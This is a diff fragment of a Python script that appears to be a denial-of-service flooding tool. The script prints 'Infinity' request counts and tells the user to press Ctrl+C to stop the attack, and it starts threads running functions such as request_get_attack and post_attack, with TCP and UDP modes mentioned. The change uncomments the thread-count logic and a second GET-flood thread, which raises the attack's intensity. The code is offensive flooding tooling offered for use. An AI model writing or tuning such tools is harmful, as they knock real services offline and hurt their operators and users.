@@ -405,7 +405,7 @@ print("[" + yl + "I" + wi + "] Infinity [ " + yl + attack.upper() + wi + " ] req
 print("[" + yl + "I" + wi + "] Press " + gr + "' Ctrl+C ' " + wi + "To Stop The Attack")
 
 
-#threads = ((threads // 2) if not (threads % 2) else (threads + 1) // 2) if not attack.startswith(('tcp', 'udp')) else threads
+threads = ((threads // 2) if not (threads % 2) else (threads + 1) // 2) if not attack.startswith(('tcp', 'udp')) else threads
 started = True
 
 for _ in range(threads):
@@ -415,10 +415,10 @@ for _ in range(threads):
         t1.daemon = True
         t1.start()
         THREADS.append(t1)
-      #  t2 = threading.Thread(target=request_get_attack)
-      #  t2.daemon = True
-      #  t2.start()
-      #  THREADS.append(t2)
+        t2 = threading.Thread(target=request_get_attack)
+        t2.daemon = True
+        t2.start()
+        THREADS.append(t2)
     elif attack == 'post':
         t3 = threading.Thread(target=post_attack)
         t3.daemon = True
